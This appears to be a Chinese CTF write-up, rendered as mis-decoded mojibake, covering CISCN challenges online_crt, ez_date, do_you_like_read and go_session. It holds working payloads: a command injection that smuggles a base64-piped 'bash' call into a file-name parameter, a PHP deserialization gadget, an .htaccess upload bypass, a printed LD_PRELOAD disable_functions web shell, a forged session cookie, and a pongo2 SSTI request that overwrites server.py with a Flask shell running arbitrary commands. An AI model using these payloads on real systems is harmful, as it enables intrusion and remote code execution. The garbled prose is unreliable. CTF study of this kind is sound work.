linuxæ–‡ä»¶åè™½ç„¶å¯ä»¥åŒ…å«å¤§éƒ¨åˆ†å¯æ‰“å°å­—ç¬¦ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé™¤å¤– é‚£å°±æ˜¯æ–œæ ï¼Œä¸èƒ½ä½¿ç”¨æ–œæ è¿™é™åˆ¶äº†å‘½ä»¤æ‰§è¡Œçš„å†…å®¹ è¿™é‡Œæœ‰ä½å¸ˆå‚…åšçš„æ˜¯åŸç¯å¢ƒï¼šä»–å½“æ—¶é€‰æ‹©äº†base64ç¼–ç ä»¥åŠæˆªæ–­ç¯å¢ƒå˜é‡æ–¹å¼ï¼Œä½†ç”±äºç›®æ ‡ç¯å¢ƒçš„é™åˆ¶æ— æ³•æˆåŠŸï¼›æ¥ç€ä»–å°±ä½¿ç”¨ç°æœ‰çš„ç¯å¢ƒå˜é‡ ä»–é€šè¿‡env&gt;qweqweå‘½ä»¤åœ¨ä¹‹åä¸‹è½½çš„æ–‡ä»¶çœ‹åˆ°äº†æœ‰ä¸€ä¸ªå˜é‡å€¼ä¸º/ï¼Œæ¥ç€å˜æˆåŠŸè¯»å–åˆ°äº†ï¼ˆè¿™é‡Œå°±è®°å½•ä¸€ä¸‹è¿™ç§æ€è·¯ï¼‰ uri=/admin%2frename?oldname=39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt&amp;newname=`ls%20${OLDPWD}&gt;yghj`.crt è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯nssctfçš„ç¯å¢ƒï¼Œæ ¹æ®wpæ‰€è¿°ï¼Œè¿™é‡Œä½¿ç”¨base64æ–¹æ³•å³å¯ payloadä¸ºï¼š uri=/admin%2frename?oldname=39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt è¿™é‡Œéœ€è¦å°†/urlç¼–ç ï¼Œç©ºæ ¼ç¼–ç æ¥ç€ç»§ç»­å°†payloadæ•´ä½“è¿›è¡Œurlç¼–ç ã€‚å› ä¸ºreturn data.decode()çš„å­˜åœ¨ import urllib.parse uri = '''/admin%2frename?oldname=a1fdda8f-fbf7-42fd-9092-2d849967c6b5.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1 Host: admin ''' gopher = uri.replace(\" \",\"\\r \") payload = urllib.parse.quote(gopher) print(payload) è¿™é‡Œæˆ‘ä»¬è®¿é—®createlinkè§¦å‘ä¸Šè¿°ä»£ç çš„æ‰§è¡Œï¼Œä¹‹åè®¿é—®/static/crt/flag.txtå³å¯æ‹¿åˆ°flagï¼ˆstaticç›®å½•å¯è¯»ï¼‰ å‚è€ƒæ–‡ç«  ç¬¬15å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ› online_crt writeup c_rehash(CVE-2022-1292) ciscn 2022 CTF | 2022 CISCN åˆèµ› WriteUp [CISCN 2022 åˆèµ›]online_crt [CISCN 2023 ååŒ—]ez_date &lt;?php error_reporting(0); highlight_file(__FILE__); class date{ public $a; public $b; public $file; public function __wakeup() { if(is_array($this-&gt;a)||is_array($this-&gt;b)){ die('no array'); } if( ($this-&gt;a !== $this-&gt;b) &amp;&amp; (md5($this-&gt;a) === md5($this-&gt;b)) &amp;&amp; (sha1($this-&gt;a)=== sha1($this-&gt;b)) ){ $content=date($this-&gt;file); $uuid=uniqid().'.txt'; file_put_contents($uuid,$content); $data=preg_replace('/((\\s)*( )+(\\s)*)/i','',file_get_contents($uuid)); echo file_get_contents($data); } else{ die(); } } } unserialize(base64_decode($_GET['code'])); ç®€å•çš„ååºåˆ—åŒ–ï¼Œè¿™é‡Œçš„æ­£åˆ™è¡¨è¾¾å¼çš„ä½œç”¨å°±æ˜¯å°†æ–‡ä»¶å†…å®¹ä¸­æ‰€æœ‰è¿ç»­çš„ç©ºæ ¼ã€æ¢è¡Œå’Œç©ºç™½å­—ç¬¦æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ã€‚é‡ç‚¹å°±æ˜¯ç»•è¿‡ç¬¬äºŒä¸ªifè¯­å¥ã€‚ è¿™é‡Œçš„ç¬¬ä¸€ä¸ªifæ¡ä»¶è¯­å¥è®©æˆ‘ä»¬æ— æ³•é€šè¿‡æ•°æ®ç»•è¿‡ä¸‹é¢çš„md5å¼ºç­‰ï¼Œçœ‹äº†wpè¯´å¯ä»¥åˆ©ç”¨æ•°å­—å’Œå­—ç¬¦æ¥ç»•è¿‡ å¦ä¸€ä¸ªæ˜¯dateå‡½æ•°çš„ç»•è¿‡ï¼šdateå‡½æ•°ä¼šå¯¹ç‰¹å®šçš„å­—æ¯è½¬åŒ–ä¸ºç‰¹å®šçš„æ—¶é—´è¡¨è¾¾æ ¼å¼ å› æ­¤æ„é€ payloadå¦‚ä¸‹ï¼š &lt;?php error_reporting(0); highlight_file(__FILE__); class date{ public $a; public $b; public $file; } $pop = new date(); $pop-&gt;a = '1'; $pop-&gt;b = 1; $pop-&gt;file = \"/f\\l\\a\\g\"; echo base64_encode(serialize($pop)); ?&gt; å‚è€ƒæ–‡ç«  ï¼ˆååºåˆ—åŒ–ï¼‰å°è®°å½• [CISCN 2023 è¥¿å—]do_you_like_read ç‚¹å‡»ç™»é™†ä¹‹åï¼Œæ ¹æ®æç¤ºç”¨æˆ·åæ˜¯adminï¼Œè¿™é‡Œå¯ä»¥è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œå½“ç„¶è¿æ°”å¥½ç›´æ¥å¼±å£ä»¤ï¼šadmin123å³å¯ç™»å½• è¿›å»ä¹‹åå¯ä»¥å‘ç°å«æœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ç¼–è¾‘ä»¥åŠåˆ é™¤ç­‰åŠŸèƒ½ï¼Œæˆ‘ä»¬å…ˆå°è¯•æ–‡ä»¶ä¸Šä¼ ï¼Œä½†ç”±äºè¿™æ˜¯ç™½ç›’å®¡è®¡ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ä¸Šä¼ æ–‡ä»¶ä»£ç å¦‚ä½•å†™ if (isset($_FILES['image']) &amp;&amp; $_FILES['image']['name'] != \"\") { $image = $_FILES['image']['name']; // æ£€æŸ¥æ–‡ä»¶åçš„æ‰©å±•åæ˜¯å¦å·²ç»æ˜¯\".php\" $ext = pathinfo($image, PATHINFO_EXTENSION); if (strtolower($ext) == 'php'|| strtolower($ext) == 'phtml' || strtolower($ext) == 'php5' || strtolower($ext) == 'php2') { // å°†æ–‡ä»¶åçš„æ‰©å±•åæ›¿æ¢ä¸º\".jpg\" $image = pathinfo($image, PATHINFO_FILENAME) . '.jpg'; } elseif (strtolower($ext) != 'jpg') { // å¿½ç•¥å…¶ä»–åç¼€åå¹¶ä¸åšä¿®æ”¹ $image = $_FILES['image']['name']; } $directory_self = str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']); $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . $directory_self . \"bootstrap/img/\"; $uploadDirectory .= $image; move_uploaded_file($_FILES['image']['tmp_name'], $uploadDirectory); } é‡ç‚¹å°±æ˜¯ä¸Šé¢è¿™ä¸€å—å„¿ï¼Œè¿™é‡Œçš„ä»£ç é€»è¾‘å°±æ˜¯ï¼šé»‘åå•é™åˆ¶æˆ‘ä»¬çš„æ–‡ä»¶åç¼€ï¼Œç„¶åå°±ä¸ç®¡äº†ï¼Œå…¶ä½™çš„ä»»ä½•æ–‡ä»¶åç¼€éƒ½è®¤ä¸ºæ˜¯æ­£ç¡®çš„ã€‚é‚£æˆ‘ä»¬è‚¯å®šå°±èƒ½åˆ©ç”¨.htaccessæ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ äº†ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š &lt;FilesMatch \"1.jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; è¿™é‡ŒæŒ‡å®šçš„æ–‡ä»¶åå¯ä»¥éšä¾¿ï¼Œä¸Šä¼ ä¹‹åä¼šå‘ç°æ²¡æœ‰æƒé™å»è¯»å–flagã€‚è¿™é‡Œå°±é wpäº†ï¼Œä»–ä»¬åšè¿™é“é¢˜éƒ½æ˜¯çº¿ä¸‹awdçš„æ¨¡å¼ï¼Œå› æ­¤ä»–ä»¬ç›´æ¥å…ˆæ˜¯ç”¨è‡ªåŠ¨åŒ–å·¥å…·å®¡è®¡äº†ä¸€ä¸‹ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªç®­å¤´å¤„çš„ä¼¼ä¹æ˜¯ä¸€ä¸ªåé—¨æ–‡ä»¶ï¼ˆå¯¹æˆ‘è¿™ä¸ªå°ç™½æ¥è¯´æˆ‘ä¸çŸ¥é“ä¸ºä½•åé—¨æ–‡ä»¶ç›´æ¥å°±åœ¨æºç é‡Œï¼‰ æˆ‘ä»¬æ ¹æ®è·¯å¾„çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶ï¼Œ &lt;?php echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" &gt; \" . $out_path . \" 2&gt;&amp;1\"; echo \"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: \" . $evil_cmdline . \"&lt;/p&gt;\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;\" . nl2br(file_get_contents($out_path)) . \"&lt;/p&gt;\"; unlink($out_path); ?&gt; è¿™é‡Œç»™å‡ºGPTå¯¹è¯¥æ–‡ä»¶å†…å®¹çš„è§£é‡Š è¿™æ®µ PHP ä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„åˆ©ç”¨ LD_PRELOAD ç»•è¿‡ disable_functions çš„æ–¹æ³•ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶å°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œç„¶åå†è¯»å–è¯¥æ–‡ä»¶çš„å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ä¸‹é¢æ˜¯ä»£ç çš„è¯¦ç»†è§£æï¼š 1. ç¬¬ä¸€è¡Œé€šè¿‡ GET è¯·æ±‚æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼šcmdï¼ˆè¦æ‰§è¡Œçš„å‘½ä»¤ï¼‰ã€outpathï¼ˆè¾“å‡ºæ–‡ä»¶è·¯å¾„ï¼‰å’Œ sopathï¼ˆè¦åŠ è½½çš„å…±äº«åº“è·¯å¾„ï¼‰ã€‚ 2. æ¥ä¸‹æ¥å°†æ¥æ”¶åˆ°çš„ cmd å‚æ•°å’Œ outpath å‚æ•°æ‹¼æ¥æˆä¸€ä¸ªå‘½ä»¤è¡Œå­—ç¬¦ä¸² evil_cmdlineï¼Œå…¶ä¸­åŒ…æ‹¬å°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶çš„éƒ¨åˆ†ã€‚ 3. ä½¿ç”¨ putenv å‡½æ•°å°† EVIL_CMDLINE ç¯å¢ƒå˜é‡è®¾ç½®ä¸º evil_cmdlineã€‚è¿™æ ·åœ¨åç»­çš„ mail å‡½æ•°è°ƒç”¨ä¸­ï¼Œmail å‡½æ•°ä¼šåœ¨æ‰§è¡Œæ—¶åŠ è½½ EVIL_CMDLINE ç¯å¢ƒå˜é‡ä¸­çš„å‘½ä»¤ã€‚ 4. å°†æ¥æ”¶åˆ°çš„ sopath å‚æ•°è®¾ç½®ä¸º LD_PRELOAD ç¯å¢ƒå˜é‡ï¼Œä»¥åŠ è½½å…±äº«åº“æ–‡ä»¶ã€‚è¿™ä¸ªå…±äº«åº“æ–‡ä»¶é€šå¸¸ç”¨äºé‡è½½ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥å®ç°ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚ç»•è¿‡ disable_functionsã€‚ 5. è°ƒç”¨ mail å‡½æ•°å‘é€ä¸€å°ç©ºé‚®ä»¶ã€‚ç”±äºåœ¨è®¾ç½® LD_PRELOAD ç¯å¢ƒå˜é‡åè°ƒç”¨ mail å‡½æ•°ï¼Œå› æ­¤ mail å‡½æ•°åœ¨æ‰§è¡Œæ—¶ä¼šåŠ è½½ LD_PRELOAD ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„å…±äº«åº“ï¼Œä»è€Œæ‰§è¡Œè®¾ç½®çš„å‘½ä»¤ã€‚ 6. æœ€åé€šè¿‡è¯»å–è¾“å‡ºæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä»¥ HTML æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚åŒæ—¶ä½¿ç”¨ unlink å‡½æ•°åˆ é™¤è¾“å‡ºæ–‡ä»¶ï¼Œä»¥ä¿è¯å®‰å…¨æ€§ã€‚ è¿™æ®µä»£ç çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºåˆ©ç”¨ LD_PRELOAD å’Œé‡å®šå‘è¾“å‡ºæ¥ç»•è¿‡ PHP çš„ disable_functions çš„æ–¹æ³•ï¼ŒåŒæ—¶ä¹Ÿå±•ç¤ºäº†ä¸€ä¸ªéå¸¸ä¸å®‰å…¨çš„ä»£ç å®ç°ã€‚ ç»“åˆä¸Šè¿°PHPæ–‡ä»¶æˆ‘ä»¬èƒ½çŸ¥é“payloadä¸ºï¼šä¸è¿‡è¿™é‡Œçš„è·¯å¾„ä¸nssctfç¯å¢ƒä¸‹ä¸ä¸€è‡´ï¼Œéœ€è¦åšå‡ºä¿®æ”¹ echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; // echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so &lt;/p&gt;\"; è¿™é‡Œçš„flagåœ¨ç¯å¢ƒå˜é‡ä¸­ å‚è€ƒæ–‡ç«  2023è¥¿å—èµ›åŒºciscn â€“ do you like read CISCNè¥¿å—å¤èµ›AWDPlus Web [CISCN 2023 åˆèµ›]go_session å‰ç½®è¯´æ˜ è¿™é‡Œå€Ÿç”¨å¸ˆå‚…å¯¹è¯¥è¯•é¢˜æ¡†æ¶çš„è¯´æ˜ ä¸‹è½½é¢˜ç›®çš„é™„ä»¶ï¼Œæ˜¯ç”¨goçš„ginæ¡†æ¶å†™çš„åç«¯ï¼Œcookie-sessionæ˜¯ç”±gorilla/sessionsæ¥å®ç°ï¼Œè€Œsessionsåº“ä½¿ç”¨äº†å¦ä¸€ä¸ªåº“ï¼šgorilla/securecookieæ¥å®ç°å¯¹cookieçš„å®‰å…¨ä¼ è¾“ã€‚è¿™é‡Œæ‰€è°“çš„å®‰å…¨ä¼ è¾“ï¼Œæ˜¯æŒ‡ä¿è¯cookieä¸­çš„å€¼ä¸èƒ½è¢«çœ‹å‡ºæ¥ï¼ˆé€šè¿‡åŠ å¯†å®ç°ï¼Œå¯é€‰ï¼‰ã€ä¿è¯ä¼ è¾“çš„cookieä¸ä¼šè¢«ç¯¡æ”¹ã€‚ securecookieçš„ç¼–ç å‡½æ•°ä¸€å…±æœ‰å››ä¸ªä¸»è¦æ­¥éª¤æ¥å®ç°è¿™ä¸€ç›®çš„ï¼š åºåˆ—åŒ–ï¼Œcookieçš„å€¼å¯ä»¥æœ‰å¤šç§å½¢å¼ï¼Œé¦–å…ˆå°†å…¶åºåˆ—åŒ–ä¸ºå­—èŠ‚åˆ‡ç‰‡ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚ åŠ å¯†ï¼ˆè¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ï¼‰ï¼Œä½¿ç”¨æŒ‡å®šçš„å¯¹ç§°åŠ å¯†æ–¹æ³•ã€åŠ å¯†å¯†é’¥ï¼Œè¿›è¡Œå¯¹valueè¿›è¡ŒåŠ å¯†ã€‚ è®¡ç®—MACå€¼ï¼Œä»¥ä¿è¯ä¸è¢«ç¯¡æ”¹ï¼Œè¿™é‡Œçš„MACæ˜¯Message Authentication Codeçš„ç¼©å†™ã€‚å¦‚ä½•è®¡ç®—å‘¢ï¼Œé€šè¿‡æŒ‡å®šçš„å“ˆå¸Œå‡½æ•°æ¥è®¡ç®—ï¼Œå¯¹ä¸Šè¿°çš„åŠ å¯†åçš„valueæ±‚ä¸€ä¸ªæ‘˜è¦ã€‚ base64ç¼–ç ï¼Œå½“è§£å¯†æ—¶ï¼Œåè¿‡æ¥å³å¯ï¼Œå› ä¸ºä¸Šè¿°ç”¨äºåŠ å¯†çš„æ–¹æ³•ä¸åŠ å¯†å¯†é’¥ã€ç”¨äºè®¤è¯çš„å“ˆå¸Œæ–¹æ³•ä¸å“ˆå¸Œå¯†é’¥ï¼Œéƒ½æ˜¯åœ¨æœåŠ¡å™¨ç«¯è®¾ç½®çš„ã€‚å‡†ç¡®æ¥è¯´å°±æ˜¯ç”±è¿™ä¸ªsecurecookieåº“çš„SecureCookieæ¥å£æ‰€è§„å®šçš„ï¼Œé€šè¿‡åŠ å¯†å¯†é’¥ä¸è®¤è¯å¯†é’¥ï¼Œä¿è¯äº†cookieä¸ä¼šè¢«è§£å¯†ã€ä¸ä¼šè¢«ç¯¡æ”¹çš„ä¸¤ä¸ªç›®çš„ã€‚ ä»£ç å®¡è®¡ main.go package main import ( \"github.com/gin-gonic/gin\" \"main/route\" ) func main() { r := gin.Default() r.GET(\"/\", route.Index) r.GET(\"/admin\", route.Admin) r.GET(\"/flask\", route.Flask) r.Run(\"0.0.0.0:80\") } indexè·¯ç”±çš„å¤„ç† var store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\"))) func Index(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { session.Values[\"name\"] = \"guest\" err = session.Save(c.Request, c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, \"Hello, guest\") } é¦–å…ˆæ˜¯é SESSION_KEYç¯å¢ƒå˜é‡çš„keyå¯¹sessionåŠ å¯†ï¼Œæ¥ç€åˆ¤æ–­sessionä¸­çš„nameé”®å€¼æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯ç©ºçš„è¯ï¼Œèµ‹å€¼ä¸ºguestã€‚ä½†ä¸è®ºnameå€¼å¦‚ä½•ï¼Œè¿™é‡Œæœ€åå›æ˜¾éƒ½æ˜¯Hello, guest Adminè·¯ç”±ï¼š func Admin(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] != \"admin\" { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } name := c.DefaultQuery(\"name\", \"ssti\") xssWaf := html.EscapeString(name)//é˜²æ­¢xss tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\") if err != nil { panic(err) } out, err := tpl.Execute(pongo2.Context{\"c\": c}) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } c.String(200, out) } è¿™é‡Œåˆ¤æ–­sessionçš„nameæ˜¯å¦ä¸ºadminï¼Œå¦‚æœä¸æ˜¯åˆ™è¿”å›500ï¼Œä¹‹åè·å–urlä¸­nameçš„å€¼ï¼Œå¦‚æœæ²¡æœ‰åˆ™é»˜è®¤ä¸ºssti ä¹‹åé€šè¿‡pongo2æ¡†æ¶è¿›è¡Œæ¸²æŸ“ Flaskè·¯ç”± func Flask(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { if err != nil { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } } resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\")) if err != nil { return } defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) c.String(200, string(body)) } åˆ¤æ–­sessionçš„nameæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™è¿”å›500ï¼›ä¹‹åå‘æœ¬åœ°çš„5000ç«¯å£å‘é€getè¯·æ±‚ï¼Œæœ€åå°†å“åº”çš„ä¿¡æ¯è¾“å‡º sessionä¼ªé€  æˆ‘ä»¬éœ€è¦è¿›è¡Œä¼ªé€ çš„åŸå› æ˜¯ï¼Œåªæœ‰sessionä¸­çš„nameå€¼ä¸ºadminçš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½åˆ©ç”¨pongo2çš„sstiæ¼æ´è¿›è¡Œrce ç»è¿‡wpçš„å‚è€ƒï¼šç”±äºæ²¡æœ‰æ‰¾åˆ°session-keyæ³„éœ²çš„ç‚¹ï¼Œå› æ­¤ä¼šå°è¯•å»çˆ†ç ´keyæˆ–è€…çŒœæµ‹ä»keyå°±æ˜¯ç©ºã€‚ è¿™é‡Œä»–ä»¬çŒœæµ‹ä¸ºç©ºçš„åŸå› æ˜¯ï¼šè¯•äº†ä¸€ä¼šå‘ç° os.Getenv å¦‚æœè·å–ä¸å­˜åœ¨çš„ç¯å¢ƒå˜é‡å°±ä¼šè¿”å›ç©ºå€¼ è¿™é‡Œå¯ä»¥åšå‡ºå¦‚ä¸Šå›¾æ‰€ç¤ºçš„ä¿®æ”¹ï¼Œéšåè¿è¡Œï¼Œåœ¨F12ä¸­æ‰¾åˆ°cookie MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ== ä¹‹åæˆ‘ä»¬å¤åˆ¶cookieè¦†ç›–åŸæœ‰æ•°æ®åŒ…ä¸­çš„cookieå³å¯ï¼Œå¦‚ä¸‹å›¾æˆåŠŸä¼ªé€  æ¥ä¸‹æ¥è®¿é—®flaskè·¯ç”±ï¼Œè¿™é‡Œå¸ˆå‚…ä»¬æ˜¯å¯¹flaskçš„nameè¿›è¡Œç•¸å½¢ä¼ å‚è€Œå¼•å‘æŠ¥é”™ï¼ˆä½†æˆ‘ä¸å¤ªæ‡‚ä¸ºä½•ï¼‰è¿™é‡Œå°†nameèµ‹å€¼ä¸ºç©ºå³å¯æŠ¥é”™ å°†æŠ¥é”™çš„æºç ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªhtmlä¸Šæ‰“å¼€å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰¾åˆ°å¯¹åº”çš„appæºç  æ³¨æ„åˆ°è¿™é‡Œdebugå¼€å¯äº†ï¼Œæ ¹æ®å¸ˆå‚…ä»¬æ‰€è¯´ï¼šè¿™å°±è¡¨æ˜ï¼ŒFlaskæ¡†æ¶æ˜¯çƒ­åŠ è½½çš„ï¼Œserver.pyå‘ç”Ÿæ”¹å˜ï¼Œç¨‹åºä¹Ÿä¼šæ›´æ–°ï¼Œå¯ä»¥åˆ©ç”¨adminè·¯ç”±æ‰§è¡ŒGoä»£ç å»è¦†ç›–æ‰server.pyå®ç°rceï¼ŒXssWafä¼šè½¬ä¹‰åŒå¼•å·ï¼Œå¯ä»¥é€šè¿‡UAå’ŒRefererç»•è¿‡ä¼ å‚ æˆ‘ä»¬çŸ¥é“pongo2æ¨¡æ¿å¼•æ“å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥æ‰§è¡Œgoçš„ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ æ–‡ä»¶è¦†ç›–server.pyï¼Œå†è®¿é—®/flaskè·¯ç”±ï¼Œæ¥æ‰§è¡Œå‘½ä»¤ æ„é€ payload è¿™é‡Œå°±æ˜¯çŸ¥è¯†ç›²åŒºäº†ã€‚ã€‚ã€‚ ä½¿ç”¨ginåŒ…çš„SaveUploadedFile()è¿›è¡Œæ–‡ä»¶ä¸Šä¼  func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error ç¬¬ä¸€ä¸ªè·å–è¡¨å•ä¸­çš„æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¿å­˜çš„ç›®å½• æ‰€ä»¥ä½¿ç”¨sstiçš„payloadä¸º {{c.SaveUploadedFile(c.FormFile(\"file\"),\"/app/server.py\")}} ä½†æ˜¯æˆ‘ä»¬åœ¨å‰é¢ä»£ç å®¡è®¡çš„æ—¶å€™çŸ¥é“ï¼ŒåŒå¼•å·ä¼šè¢«html.EscapeStringè½¬ä¹‰è¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ æˆ‘ä»¬åˆ©ç”¨ginä¸­çš„Context.HandlerName() HandlerName è¿”å›ä¸»å¤„ç†ç¨‹åºçš„åç§°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¤„ç†ç¨‹åºæ˜¯â€œhandleGetUsers()â€ï¼Œæ­¤å‡½æ•°å°†è¿”å›â€œmain.handleGetUsersâ€ æ‰€ä»¥å¦‚æœæ˜¯åœ¨Admin()é‡Œï¼Œè¿”å›çš„å°±æ˜¯main/route.Adminï¼Œç„¶åé…åˆè¿‡æ»¤å™¨lastè·å–åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯æ–‡ä»¶åä¸ºn è¿˜æœ‰ä¸€ä¸ªContext.Request.Referer()Request.Refererï¼šè¿”å›headeré‡Œçš„Refererçš„å€¼ æˆ‘ä»¬å¯ä»¥åœ¨è¯·æ±‚ä¸­çš„Refererçš„å€¼æ·»åŠ ä¸º/app/server.pyï¼Œæ‰€ä»¥æ„é€ æœ€ç»ˆpayload {{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())} ä½†æ˜¯åœ¨æ•°æ®åŒ…ä¸­æ·»åŠ è¯·æ±‚å¤´æ—¶è¿˜è¦æ·»åŠ  Content-Type å¤´ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND å¯¹äºæ·»åŠ è¿™ä¸ªå¤´çš„è§£é‡Šæ˜¯ å¯¹è¡¨å•æäº¤ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è®¾ç½®åˆé€‚çš„ Content-Type è¯·æ±‚ï¼ŒåŒæ—¶ ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„è¾¹ç•Œå­—ç¬¦ä¸²ï¼Œå¹¶åœ¨è¯·æ±‚ä½“ä¸­ä½¿ç”¨è¿™ä¸ªè¾¹ç•Œå­—ç¬¦ä¸²å°†è¡¨å•å­—æ®µå’Œæ–‡ä»¶è¿›è¡Œåˆ†éš”ã€‚å¦‚æœè¡¨å•ä¸­åŒ…å«æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œéœ€è¦ ä½¿ç”¨ multipart/form-data ç±»å‹çš„è¯·æ±‚ä½“æ ¼å¼ã€‚ æ³¨æ„åˆ†éš”ç¬¦çš„å¼€å§‹å’Œç»“æŸæ ¼å¼ --åˆ†éš”ç¬¦ ... ... --åˆ†éš”ç¬¦-- è¦†ç›–server.pyï¼Œè®¿é—®./adminï¼Œæ•°æ®åŒ…å¦‚ä¸‹ GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1 Host: node5.anna.nssctf.cn:28661 Referer: /app/server.py Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session-name=MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ== Upgrade-Insecure-Requests: 1 Content-Length: 423 ------WebKitFormBoundary8ALIn5Z2C3VlBqND Content-Disposition: form-data; name=\"n\"; filename=\"1.py\" Content-Type: text/plain from flask import * import os app = Flask(__name__) @app.route('/') def index(): name = request.args['name'] file=os.popen(name).read() return file if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=5000, debug=True) ------WebKitFormBoundary8ALIn5Z2C3VlBqND-- 